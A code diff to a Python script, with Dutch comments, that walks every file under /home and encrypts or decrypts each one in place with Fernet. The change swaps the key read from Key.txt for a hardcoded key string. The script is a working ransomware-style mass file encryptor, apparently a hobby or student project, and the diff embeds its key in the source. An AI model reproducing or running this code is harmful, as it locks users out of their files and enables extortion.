@@ -25,11 +25,10 @@ for dirpath, dirs, files in os.walk('/home'):
       bestandenlijst.append(fname)
 
 #Decrypt
+key = "LvKBgbdRvSZZHwBt9WcJw9rR5Aya4BIkzi-NpZKGnzw="
 if check_1 == 1:
    print("DEcrypt")
-   with open('Key.txt', 'rb') as f:
-      key = f.read()
-      crypto = Fernet(key)
+   crypto = Fernet(key)
    for file in bestandenlijst:
       try:
          with open(file, 'rb') as f:
@@ -42,9 +41,7 @@ if check_1 == 1:
 else:
    #Encryptiefunctie gebaseerd op lijst.
     print("Encrypt")
-    with open('Key.txt', 'rb') as f:
-       key = f.read()
-       crypto = Fernet(key)
+    crypto = Fernet(key)
     for file in bestandenlijst:
         with open(file, 'rb') as f:
             file_inhoud = f.read()
